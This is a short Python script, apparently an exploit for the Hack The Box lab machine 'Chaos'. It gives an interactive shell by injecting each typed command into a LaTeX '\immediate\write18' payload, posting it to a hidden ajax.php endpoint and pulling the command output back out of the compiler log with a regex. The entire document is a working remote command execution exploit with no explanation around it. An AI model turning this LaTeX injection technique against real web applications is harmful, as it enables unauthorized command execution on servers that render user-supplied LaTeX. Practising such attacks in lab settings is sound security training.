import re
import requests

headers = {
	'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
	'X-Requested-With': 'XMLHttpRequest',
	'Cookie': 'redirect=1'
}

while (True):
	cmd = raw_input('> ')

	data = {
		'content': '\\immediate\\write18{%s}' % cmd,
		'template': 'test1'
	}

	r = requests.post('http://chaos.htb/J00_w1ll_f1Nd_n07H1n9_H3r3/ajax.php', headers=headers, data=data)
	out = r.text
	m = re.search('.*\(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsa.fd\)\n\(/usr/share/texlive/texmf-dist/tex/latex/amsfonts/umsb.fd\)(.*)\[1', out, re.MULTILINE|re.DOTALL)
	if m:
		print m.group(1)
